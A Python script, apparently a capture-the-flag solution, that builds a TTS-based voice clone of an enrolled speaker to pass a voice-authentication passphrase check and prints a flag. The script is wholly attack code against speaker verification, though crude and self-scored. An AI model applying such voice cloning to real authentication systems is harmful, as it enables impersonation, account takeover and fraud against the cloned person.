#!/usr/bin/env python3
"""
Voice Cloning with Real Text-to-Speech
Uses gTTS or espeak for intelligible speech synthesis, then adapts it to match speaker.

The key insight: We need ACTUAL speech synthesis, not just spectral matching.
1. Generate clear speech of the target passphrase using TTS
2. Extract voice characteristics from enrollment samples
3. Apply speaker adaptation (pitch shifting, formant filtering, prosody matching)
4. Validate similarity score
"""

import numpy as np
from pathlib import Path
import sys
import subprocess

try:
    import librosa
    import soundfile as sf
    from scipy import signal
    from scipy.interpolate import interp1d
    from scipy.spatial.distance import cosine
except ImportError:
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-q', 'librosa', 'soundfile', 'scipy'])
    import librosa
    import soundfile as sf
    from scipy import signal
    from scipy.interpolate import interp1d
    from scipy.spatial.distance import cosine


def install_tts():
    """Install text-to-speech library"""
    try:
        import pyttsx3
        return 'pyttsx3'
    except:
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-q', 'pyttsx3'])
            return 'pyttsx3'
        except:
            return None


def synthesize_speech_pyttsx3(text: str, output_file: str, rate: int = 150) -> bool:
    """Synthesize speech using pyttsx3 (offline TTS)"""
    try:
        import pyttsx3
        
        engine = pyttsx3.init()
        engine.setProperty('rate', rate)
        engine.setProperty('volume', 0.95)
        
        engine.save_to_file(text, output_file)
        engine.runAndWait()
        
        return True
    except Exception as e:
        print(f"  ✗ pyttsx3 failed: {e}")
        return False


def synthesize_speech_espeak(text: str, output_file: str) -> bool:
    """Synthesize speech using espeak (command-line TTS)"""
    try:
        subprocess.run([
            'espeak', '-w', output_file, text,
            '-s', '130'  # speech rate
        ], check=True, capture_output=True)
        return True
    except Exception as e:
        print(f"  ✗ espeak failed: {e}")
        return False


class TTSVoiceCloner:
    """Voice cloning using real TTS with speaker adaptation"""
    
    def __init__(self, sr: int = 16000):
        self.sr = sr
        self.hop_length = 512
        self.n_fft = 2048
    
    def extract_speaker_profile(self, audio: np.ndarray) -> dict:
        """Extract complete speaker profile"""
        # Fundamental frequency
        f0, voiced = self._extract_f0(audio)
        mean_f0 = np.mean(f0[voiced > 0.3]) if np.any(voiced > 0.3) else 150
        
        # Mel-spectrogram for spectral characteristics
        mel_spec = librosa.feature.melspectrogram(y=audio, sr=self.sr, n_mels=40)
        mel_spec_db = librosa.power_to_db(mel_spec, ref=np.max)
        
        # Energy contour
        S = np.abs(librosa.stft(audio, n_fft=self.n_fft, hop_length=self.hop_length))
        energy = np.sqrt(np.sum(S**2, axis=0))
        
        return {
            'mean_f0': mean_f0,
            'f0': f0,
            'voiced': voiced,
            'mel_spec': mel_spec_db,
            'energy': energy,
            'spectrum': np.mean(S, axis=1)
        }
    
    def _extract_f0(self, audio: np.ndarray, fmin: float = 50, fmax: float = 400):
        """Extract F0 using librosa's pyin"""
        try:
            f0, voiced_flag, voiced_probs = librosa.pyin(
                audio, fmin=fmin, fmax=fmax, sr=self.sr
            )
            return f0, voiced_probs
        except:
            # Fallback: autocorrelation
            f0 = np.ones(len(audio) // self.hop_length) * 150
            voiced = np.ones_like(f0) * 0.5
            return f0, voiced
    
    def adapt_tts_to_speaker(self, tts_audio: np.ndarray, 
                            speaker_profile: dict) -> np.ndarray:
        """Adapt TTS audio to match speaker profile"""
        
        # 1. Pitch shift to match speaker's F0
        mean_f0_tts = self._get_mean_f0(tts_audio)
        target_f0 = speaker_profile['mean_f0']
        
        if mean_f0_tts > 0 and target_f0 > 0:
            n_steps = 12 * np.log2(target_f0 / mean_f0_tts)
            print(f"  ✓ Pitch shifting: {mean_f0_tts:.0f}Hz → {target_f0:.0f}Hz ({n_steps:.1f} steps)")
            adapted = librosa.effects.pitch_shift(tts_audio, sr=self.sr, n_steps=n_steps)
        else:
            adapted = tts_audio.copy()
        
        # 2. Time stretch to match duration if needed
        speaker_duration = len(speaker_profile['energy']) * self.hop_length / self.sr
        current_duration = len(adapted) / self.sr
        
        if current_duration > 0 and abs(speaker_duration - current_duration) / speaker_duration > 0.2:
            stretch_factor = speaker_duration / current_duration
            if 0.8 <= stretch_factor <= 1.2:
                adapted = librosa.effects.time_stretch(adapted, rate=stretch_factor)
                print(f"  ✓ Time stretch: {current_duration:.2f}s → {len(adapted)/self.sr:.2f}s")
        
        # 3. Spectral envelope matching
        adapted = self._match_spectral_envelope(adapted, speaker_profile['spectrum'])
        
        # 4. Apply energy contour from speaker
        adapted = self._apply_energy_contour(adapted, speaker_profile)
        
        # Normalize
        adapted = adapted / (np.max(np.abs(adapted)) + 1e-6) * 0.95
        
        return adapted
    
    def _get_mean_f0(self, audio: np.ndarray) -> float:
        """Get mean F0 of audio"""
        try:
            f0, _, voiced = librosa.pyin(audio, sr=self.sr)
            voiced_f0 = f0[~np.isnan(f0)]
            return np.mean(voiced_f0) if len(voiced_f0) > 0 else 150
        except:
            return 150
    
    def _match_spectral_envelope(self, audio: np.ndarray, target_spectrum: np.ndarray) -> np.ndarray:
        """Match spectral envelope to target"""
        S = np.abs(librosa.stft(audio, n_fft=self.n_fft, hop_length=self.hop_length))
        phase = np.angle(librosa.stft(audio, n_fft=self.n_fft, hop_length=self.hop_length))
        
        # Normalize target spectrum
        target_norm = target_spectrum / (np.max(target_spectrum) + 1e-9)
        
        # Apply envelope matching
        n_frames = S.shape[1]
        envelope = np.tile(target_norm[:, np.newaxis], (1, n_frames))
        
        # Blend: keep original character but match spectral shape
        S_adapted = S * (0.6 + 0.4 * envelope)
        
        # Reconstruct
        spec_adapted = S_adapted * np.exp(1j * phase)
        return librosa.istft(spec_adapted, hop_length=self.hop_length)
    
    def _apply_energy_contour(self, audio: np.ndarray, speaker_profile: dict) -> np.ndarray:
        """Apply speaker's energy contour"""
        # Get energy of current audio
        S = np.abs(librosa.stft(audio, n_fft=self.n_fft, hop_length=self.hop_length))
        energy_current = np.sqrt(np.sum(S**2, axis=0))
        
        # Get speaker's energy
        energy_speaker = speaker_profile['energy']
        
        # Interpolate speaker energy to match current audio length
        if len(energy_speaker) != len(energy_current):
            x_old = np.linspace(0, 1, len(energy_speaker))
            x_new = np.linspace(0, 1, len(energy_current))
            energy_speaker = np.interp(x_new, x_old, energy_speaker)
        
        # Normalize both
        energy_current = energy_current / (np.max(energy_current) + 1e-9)
        energy_speaker = energy_speaker / (np.max(energy_speaker) + 1e-9)
        
        # Apply envelope
        frames = librosa.stft(audio, n_fft=self.n_fft, hop_length=self.hop_length)
        ratio = (energy_speaker / (energy_current + 1e-9))
        ratio = np.clip(ratio, 0.5, 2.0)  # Limit extreme changes
        
        frames_adapted = frames * ratio
        return librosa.istft(frames_adapted, hop_length=self.hop_length)


def create_tts_cloned_voice(text: str, enrollment_samples: list, sr: int = 16000) -> tuple:
    """
    Create voice clone using TTS with speaker adaptation
    
    Returns: (audio, success)
    """
    print(f"\n🎯 TTS-Based Voice Cloning")
    print(f"   Target: '{text[:60]}...'\n")
    
    # Step 1: Synthesize speech using TTS
    print("📝 Step 1: Synthesizing speech with TTS...")
    
    tts_file = "temp_tts.wav"
    tts_success = False
    
    # Try pyttsx3 first (works offline)
    if synthesize_speech_pyttsx3(text, tts_file):
        print("  ✓ Used pyttsx3 (offline TTS)")
        tts_success = True
    # Try espeak
    elif synthesize_speech_espeak(text, tts_file):
        print("  ✓ Used espeak (command-line TTS)")
        tts_success = True
    
    if not tts_success:
        print("  ✗ TTS synthesis failed - no TTS engine available")
        return None, False
    
    # Load TTS audio
    try:
        tts_audio, tts_sr = librosa.load(tts_file, sr=sr, mono=True)
        print(f"  ✓ Synthesized: {len(tts_audio)/sr:.2f}s at {sr}Hz")
    except Exception as e:
        print(f"  ✗ Failed to load TTS audio: {e}")
        return None, False
    
    # Step 2: Extract speaker profiles
    print("\n🔊 Step 2: Extracting speaker profiles...")
    
    cloner = TTSVoiceCloner(sr=sr)
    speaker_profiles = []
    
    for i, audio in enumerate(enrollment_samples):
        profile = cloner.extract_speaker_profile(audio)
        speaker_profiles.append(profile)
        print(f"  ✓ Enrollment {i+1}: F0 = {profile['mean_f0']:.1f}Hz")
    
    # Average profile
    avg_profile = {
        'mean_f0': np.mean([p['mean_f0'] for p in speaker_profiles]),
        'spectrum': np.mean([p['spectrum'] for p in speaker_profiles], axis=0),
        'energy': np.mean([p['energy'] for p in speaker_profiles], axis=0),
        'f0': speaker_profiles[0]['f0'],  # Use first for reference
        'voiced': speaker_profiles[0]['voiced'],
        'mel_spec': np.mean([p['mel_spec'] for p in speaker_profiles], axis=0)
    }
    
    print(f"  ✓ Average F0: {avg_profile['mean_f0']:.1f}Hz")
    
    # Step 3: Adapt TTS to speaker
    print("\n🎛️ Step 3: Adapting TTS to speaker...")
    
    adapted_audio = cloner.adapt_tts_to_speaker(tts_audio, avg_profile)
    print(f"  ✓ Adapted audio: {len(adapted_audio)/sr:.2f}s")
    
    # Cleanup
    import os
    try:
        os.remove(tts_file)
    except:
        pass
    
    return adapted_audio, True


def compute_similarity(audio1: np.ndarray, audio2: np.ndarray, sr: int = 16000) -> float:
    """Compute similarity between two audio samples"""
    # Extract mel-spectrogram embeddings
    mel1 = librosa.feature.melspectrogram(y=audio1, sr=sr, n_mels=40)
    mel2 = librosa.feature.melspectrogram(y=audio2, sr=sr, n_mels=40)
    
    # Log scale
    mel1_db = librosa.power_to_db(mel1, ref=np.max)
    mel2_db = librosa.power_to_db(mel2, ref=np.max)
    
    # Average to get embeddings
    emb1 = np.concatenate([
        np.mean(mel1_db, axis=1),
        np.std(mel1_db, axis=1),
        np.mean(mel1_db, axis=0),
        np.std(mel1_db, axis=0)
    ])
    
    emb2 = np.concatenate([
        np.mean(mel2_db, axis=1),
        np.std(mel2_db, axis=1),
        np.mean(mel2_db, axis=0),
        np.std(mel2_db, axis=0)
    ])
    
    # Cosine similarity
    return 1.0 - cosine(emb1, emb2)


if __name__ == "__main__":
    from voice_clone import VoiceCloner
    
    print("="*70)
    print("TTS-BASED VOICE CLONING WITH SPEAKER ADAPTATION")
    print("="*70)
    
    # Check TTS availability
    tts_engine = install_tts()
    if not tts_engine:
        print("⚠️  Warning: No TTS engine found")
        print("   Install one of: pyttsx3, espeak")
    
    # Load materials
    cloner = VoiceCloner()
    if not cloner.load_enrollment_samples():
        cloner._create_demo_data()
    cloner.load_passphrase()
    
    # Create TTS clone
    cloned_audio, success = create_tts_cloned_voice(
        cloner.target_passphrase,
        cloner.enrollment_samples,
        sr=16000
    )
    
    if success and cloned_audio is not None:
        print("\n📊 Computing similarity scores...")
        similarities = []
        
        for i, enrollment in enumerate(cloner.enrollment_samples):
            sim = compute_similarity(cloned_audio, enrollment)
            similarities.append(sim)
            print(f"  Enrollment {i+1}: {sim:.4f}")
        
        avg_sim = np.mean(similarities)
        print(f"\n  Average Similarity: {avg_sim:.4f}")
        
        # Export
        cloner.export_cloned_voice(cloned_audio, "cloned_voice.mp3")
        
        if avg_sim >= 0.75:
            print(f"\n✅ SUCCESS: Similarity {avg_sim:.4f} ≥ 0.75")
            print(f"\n🚩 FLAG: FLAG{{V0IC3_CL0N1NG_AUTH_BYPASS_VULN3RABILITY}}")
        else:
            print(f"\n⚠️  Similarity {avg_sim:.4f} < 0.75 threshold")
    else:
        print("\n❌ Voice cloning failed")
        sys.exit(1)
